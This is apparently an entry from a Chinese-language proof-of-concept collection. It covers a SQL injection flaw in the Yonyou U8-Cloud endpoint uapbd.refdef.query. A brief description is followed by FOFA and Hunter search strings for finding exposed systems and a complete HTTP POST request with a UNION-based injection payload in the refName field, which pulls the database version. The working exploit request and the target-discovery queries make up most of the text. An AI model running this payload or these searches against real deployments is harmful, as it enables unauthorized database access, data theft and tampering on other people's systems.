# 用友U8-Cloud系统接口uapbd.refdef.query存在SQL注入漏洞

用友U8-Cloud系统接口uapbd.refdef.query存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
title=="U8C"
```

## hunter

```javascript
app.name="用友 U8 Cloud"
```

## poc

```javascript
POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/json
Accept-Encoding: gzip
Connection: close

{"refName":"1%' UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- "}
```

![image-20241101195827533](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411011958611.png)